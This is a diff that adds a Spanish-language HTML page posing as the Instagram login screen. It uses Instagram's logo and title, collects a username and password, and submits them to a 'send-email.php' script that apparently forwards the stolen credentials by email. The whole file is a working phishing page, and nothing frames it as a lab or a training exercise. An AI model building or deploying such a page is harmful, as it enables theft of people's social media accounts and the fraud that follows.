@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login - Instagram</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-box">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/a/a5/Instagram_icon.png/512px-Instagram_icon.png" alt="Instagram" class="logo">
+            <form action="send-email.php" method="POST">
+                <input type="text" name="username" placeholder="Número de teléfono, nombre de usuario o correo electrónico" required>
+                <input type="password" name="password" placeholder="Contraseña" required>
+                <button type="submit" class="btn">Iniciar sesión</button>
+            </form>
+            <div class="separator">
+                <span>¿Olvidaste tu contraseña?</span>
+            </div>
+            <div class="sign-up">
+                <span>¿No tienes cuenta? <a href="#">Regístrate</a></span>
+            </div>
+        </div>
+    </div>
+</body>
+</html>
